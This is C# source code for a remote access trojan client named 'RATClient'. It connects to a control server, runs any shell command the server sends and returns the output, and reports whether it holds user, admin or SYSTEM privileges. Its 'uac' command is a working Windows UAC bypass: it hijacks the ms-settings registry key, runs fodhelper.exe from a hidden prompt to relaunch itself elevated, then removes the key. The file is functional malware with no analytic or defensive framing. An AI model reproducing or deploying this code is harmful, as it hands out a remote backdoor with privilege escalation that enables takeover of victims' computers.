using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.Win32;

namespace RATClient
{
    class Program
    {
        private static string privilegeLevel = "USER"; // default privilege level

        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    TcpClient client = new TcpClient("localhost", 8888);
                    Console.WriteLine("[Connected to server]");

                    while (true)
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead = client.GetStream().Read(buffer, 0, buffer.Length);
                        string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        command = command.Trim();

                        if (command == "help")
                        {
                            string response = "Available Commands:\n";
                            response += "cmd [command]: Executes the specified command in a command prompt.\n";
                            response += "priv: Displays the current privilege level of the client.\n";
                            response += "uac: Attempts to escalate the client's privileges by exploiting the fodhelper.exe binary.";
                            byte[] responseBytes = Encoding.ASCII.GetBytes(response);
                            client.GetStream().Write(responseBytes, 0, responseBytes.Length);
                        }
                        else if (command.StartsWith("cmd "))
                        {
                            string cmdArgs = command.Substring(4);
                            string output = ExecuteCommand(cmdArgs);
                            byte[] outputBytes = Encoding.ASCII.GetBytes(output);
                            client.GetStream().Write(outputBytes, 0, outputBytes.Length);

                            byte[] successBytes = Encoding.ASCII.GetBytes("Command Executed Successfully.");
                            client.GetStream().Write(successBytes, 0, successBytes.Length);
                        }
                        else if (command == "priv")
                        {
                            string response = "Running as ";
                            if (IsRunningAsSystem())
                            {
                                response += "SYSTEM";
                            }
                            else if (IsRunningAsAdmin())
                            {
                                response += "ADMIN";
                            }
                            else
                            {
                                response += "USER";
                            }

                            byte[] responseBytes = Encoding.ASCII.GetBytes(response);
                            client.GetStream().Write(responseBytes, 0, responseBytes.Length);
                        }
                        else if (command == "uac")
                        {
                            string response = "Restarting client with elevated privileges...";
                            byte[] responseBytes = Encoding.ASCII.GetBytes(response);
                            client.GetStream().Write(responseBytes, 0, responseBytes.Length);
                            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                            key.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                            key.SetValue("DelegateExecute", "");

                            // start hidden command prompt process to run fodhelper.exe and delete the regkey
                            ProcessStartInfo psi = new ProcessStartInfo();
                            psi.FileName = "cmd.exe";
                            psi.Arguments = "/c \"timeout /t 1 > nul & fodhelper.exe & TASKKILL /f /im Shell.exe & exit\"";
                            psi.WindowStyle = ProcessWindowStyle.Hidden;
                            Process myProcess = new Process();
                            myProcess.StartInfo = psi;
                            myProcess.Start();
                            myProcess.WaitForExit();
                            Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\shell\open\command");
                        }
                        else
                        {
                            byte[] responseBytes = Encoding.ASCII.GetBytes("Invalid command.");
                            client.GetStream().Write(responseBytes, 0, responseBytes.Length);
                        }
                    }

                    // close the client connection before restarting
                    client.Close();
                }
                catch (Exception)
                {
                    Console.WriteLine("\nReconnecting...");
                    Thread.Sleep(5000);
                }
            }
        }


        static string ExecuteCommand(string command)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output;
        }

        static bool IsRunningAsAdmin()
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }

        static bool IsRunningAsSystem()
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            return identity.IsSystem;
        }
    }
}
